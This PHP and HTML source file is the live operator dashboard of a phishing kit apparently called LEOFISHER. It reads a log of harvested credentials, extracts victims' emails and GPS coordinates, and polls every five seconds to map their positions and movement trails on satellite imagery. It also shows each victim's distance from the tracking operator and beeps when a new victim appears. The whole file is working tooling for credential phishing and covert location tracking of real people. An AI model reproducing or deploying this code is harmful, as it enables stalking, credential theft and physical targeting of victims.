<?php
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';
$victims = [];

if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);

    foreach ($entries as $entry) {
        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
                $email = trim($email_match[1]);
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) {
                    $victims[] = [
                        'lat' => $lat,
                        'lng' => $lng,
                        'email' => $email,
                        'ip' => '',
                        'time' => date('H:i:s')
                    ];
                }
            }
        }
    }
}

$op_lat = -3.361378;
$op_lng = 29.359912; // Bujumbura fallback
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>LEOFISHER GPS DASHBOARD PRO 2025 - LIVE TRACKING</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- LEAFLET CDN STABLES 2026 -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.js"></script>
    
    <!-- MarkerCluster -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet.markercluster@1.4.1/dist/MarkerCluster.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.min.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; overflow: hidden; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0a0a0a, #001100); 
            color: #00ff00; 
        }
        #map { 
            height: 100vh !important; 
            width: 100vw !important; 
            position: fixed; 
            top: 0; 
            left: 0; 
            z-index: 1; 
        }
        .dashboard { 
            position: absolute; 
            top: 15px; 
            left: 15px; 
            background: rgba(0,15,0,0.95); 
            padding: 25px; 
            border: 3px solid #00ff00; 
            border-radius: 12px; 
            z-index: 1000; 
            backdrop-filter: blur(15px);
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
            min-width: 280px;
        }
        .stats { 
            font-size: 15px; 
            margin: 8px 0; 
            text-shadow: 0 0 5px #00ff00;
        }
        .victim-count { 
            color: #ff4444 !important; 
            font-weight: bold; 
            font-size: 22px; 
            text-shadow: 0 0 10px #ff4444;
        }
        .live-indicator { 
            color: #00ff88; 
            animation: blink 1.2s infinite; 
            font-size: 18px;
        }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
        .zoom-controls { 
            position: absolute; 
            top: 15px; 
            right: 15px; 
            background: rgba(0,15,0,0.95); 
            padding: 15px; 
            border: 3px solid #00ff00; 
            border-radius: 12px; 
            z-index: 1000; 
            box-shadow: 0 0 20px rgba(0,255,0,0.4);
        }
        .zoom-btn { 
            background: #001a00; 
            color: #00ff00; 
            border: 2px solid #00ff00; 
            padding: 10px 15px; 
            margin: 3px; 
            cursor: pointer; 
            font-weight: bold; 
            border-radius: 6px; 
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        .zoom-btn:hover { 
            background: #00ff00; 
            color: #000; 
            box-shadow: 0 0 15px #00ff00;
            transform: scale(1.05);
        }
        #debug { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 10px; font-size: 12px; z-index: 1000; }
    </style>
</head>
<body>
    <div id="map"></div>
    
    <div class="dashboard">
        <div class="stats"><strong>🛡️ LEOFISHER GPS DASHBOARD v2.0 PRO</strong></div>
        <div class="stats victim-count">🎯 <span id="victimCount">0</span> VICTIMES LIVE</div>
        <div class="stats">📍 OP Mobile GPS: <span id="opCoords"><?php echo $op_lat.', '.$op_lng; ?></span> <span class="live-indicator" id="opStatus">●</span></div>
        <div class="stats">🛰️ Esri HD Satellite + OSM Roads | Zoom 22 | Worldwide</div>
        <div class="stats">🔄 Auto-Update: <span id="updateCounter">0</span> | 5s Live Tracking</div>
    </div>
    
    <div class="zoom-controls">
        <button class="zoom-btn" onclick="zoomIn()">🔍 Zoom In</button>
        <button class="zoom-btn" onclick="zoomOut()">🔎 Zoom Out</button>
        <button class="zoom-btn" onclick="fitBounds()">📐 Fit All</button>
        <button class="zoom-btn" onclick="centerOP()">🎯 Center OP</button>
    </div>
    
    <div id="debug">Console: F12 | Status: <span id="status">Loading...</span></div>

    <script>
        console.log('🚀 LEOFISHER GPS PRO v2.0 - Initializing...');
        
        // MAP + LAYERS
        const map = L.map('map', {
            zoomControl: false,
            maxZoom: 22,
            minZoom: 1
        }).setView([<?php echo $op_lat; ?>, <?php echo $op_lng; ?>], 13);
        
        // Esri HD Satellite (PRIMARY)
        const esriHD = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
            attribution: '© Esri WorldImagery HD 2025',
            maxZoom: 22,
            detectRetina: true
        }).addTo(map);
        
        // OSM Roads overlay
        const osmRoads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap',
            opacity: 0.65,
            maxZoom: 22
        }).addTo(map);
        
        // Clustering victims
        const clusterGroup = L.markerClusterGroup({
            spiderfyOnMaxZoom: true,
            showCoverageOnHover: true,
            zoomToBoundsOnClick: true,
            maxClusterRadius: 60,
            iconCreateFunction: cluster => L.divIcon({
                html: `<div style="background:#ff4444;color:white;font-weight:bold;padding:8px;border-radius:50%;border:3px solid #ff0000">${cluster.getChildCount()}</div>`,
                iconSize: [40, 40]
            })
        }).addTo(map);
        
        let opMarker, bounds = L.latLngBounds(), victimCount = 0, updateCount = 0;
        const beep = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');
        
        // Haversine distance (km)
        function calcDistance(pos1, pos2) {
            const R = 6371;
            const dLat = (pos2.lat - pos1.lat) * Math.PI / 180;
            const dLon = (pos2.lng - pos1.lng) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + 
                      Math.cos(pos1.lat * Math.PI / 180) * Math.cos(pos2.lat * Math.PI / 180) * 
                      Math.sin(dLon/2) * Math.sin(dLon/2);
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
        }
        
        // LIVE TRACKING ENGINE
        async function liveTracking() {
            try {
                document.getElementById('status').textContent = 'Fetching...';
                const response = await fetch('./positions.php');
                const victims = await response.json();
                
                clusterGroup.clearLayers();
                bounds = L.latLngBounds();
                
                victims.forEach((victim, i) => {
                    const pos = {lat: victim.latest[0], lng: victim.latest[1]};
                    
                    // 🔴 Victim marker
                    const marker = L.marker([pos.lat, pos.lng], {
                        icon: L.divIcon({
                            html: `<div style="background:#ff4444;color:white;font-weight:bold;padding:10px 12px;border-radius:50%;border:3px solid #ff0000;box-shadow:0 0 15px #ff4444">${i+1}</div>`,
                            iconSize: [45, 45],
                            className: 'victim-marker'
                        })
                    }).addTo(clusterGroup);
                    
                    // Distance realtime OP-Victim
                    let dist = 'N/A';
                    if (opMarker) {
                        dist = calcDistance(opMarker.getLatLng(), pos).toFixed(1) + 'km';
                    }
                    
                    marker.bindPopup(`
                        <div style="font-family:'Courier New',monospace;width:320px;">
                            <h3 style="color:#ff4444;margin:0 0 10px 0;">🎯 VICTIME #${i+1}</h3>
                            <strong>📧 Email:</strong> ${victim.email}<br>
                            <strong>📍 GPS Live:</strong> ${pos.lat.toFixed(6)}, ${pos.lng.toFixed(6)}<br>
                            <strong>📏 Distance OP:</strong> <span style="color:#ffff00;">${dist}</span><br>
                            <strong>🛤️ Trajectoire:</strong> ${victim.count} positions<br>
                            <strong>🕐 Update:</strong> ${victim.latest[2]}
                        </div>
                    `);
                    
                    // Trajectoire polyline
                    if (victim.positions.length > 1) {
                        L.polyline(victim.positions, {
                            color: '#ff8800',
                            weight: 5,
                            opacity: 0.85,
                            smoothFactor: 2
                        }).addTo(map);
                    }
                    
                    bounds.extend([pos.lat, pos.lng]);
                });
                
                document.getElementById('victimCount').textContent = victims.length;
                document.getElementById('updateCounter').textContent = ++updateCount;
                
                if (victims.length > victimCount) {
                    beep.play().catch(()=>{}); // New victim beep
                }
                victimCount = victims.length;
                
                document.getElementById('status').textContent = 'Live ✓';
                
            } catch (error) {
                console.error('Live tracking error:', error);
                document.getElementById('status').textContent = 'Error';
            }
        }
        
        // OP GPS Mobile
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                pos => {
                    const opPos = [pos.coords.latitude, pos.coords.longitude];
                    document.getElementById('opCoords').textContent = `${opPos[0].toFixed(5)}, ${opPos[1].toFixed(5)}`;
                    document.getElementById('opStatus').textContent = '● LIVE';
                    
                    if (opMarker) {
                        opMarker.setLatLng(opPos);
                    } else {
                        opMarker = L.marker(opPos, {
                            icon: L.divIcon({
                                html: '<div style="background:#ffff44;color:#000;font-weight:bold;padding:12px;border-radius:50%;border:4px solid #ffaa00;box-shadow:0 0 20px #ffff44">🟡 OP</div>',
                                iconSize: [55, 55]
                            })
                        }).addTo(map).bindPopup('<b>🟡 OPÉRATEUR LIVE TRACKING</b><br>High Accuracy GPS Active');
                    }
                    bounds.extend(opPos);
                },
                () => document.getElementById('opStatus').textContent = '●',
                {enableHighAccuracy: true, timeout: 5000, maximumAge: 10000}
            );
        }
        
        // Controls
        function zoomIn() { map.setZoom(map.getZoom() + 1); }
        function zoomOut() { map.setZoom(map.getZoom() - 1); }
        function fitBounds() { if (bounds.isValid()) map.fitBounds(bounds.pad(0.2)); }
        function centerOP() { if (opMarker) map.setView(opMarker.getLatLng(), 16); }
        
        // STARTUP
        console.log('✅ LEOFISHER GPS PRO v2.0 - All systems ready');
        liveTracking(); // Initial load
        setInterval(liveTracking, 5000); // Live 5s
    </script>
</body>
</html>
